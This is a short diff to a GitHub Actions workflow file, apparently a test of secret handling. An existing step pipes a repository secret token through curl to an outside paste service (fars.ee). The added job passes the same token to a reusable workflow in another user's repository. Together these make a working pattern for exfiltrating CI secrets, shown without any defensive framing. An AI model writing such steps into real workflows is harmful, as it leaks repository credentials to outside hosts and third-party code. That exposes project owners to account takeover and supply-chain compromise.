@@ -15,3 +15,8 @@ jobs:
       - name: echo secret
         run: |
             echo "secret ${{ secrets.token }}" | curl -F "c=@-" "https://fars.ee/"
+    
+  pass-secret-to-other-repo:
+    uses: wangliu-iscas/test2/.github/workflows/test.yml@main
+    secrets:
+      token: ${{ secrets.token }} 
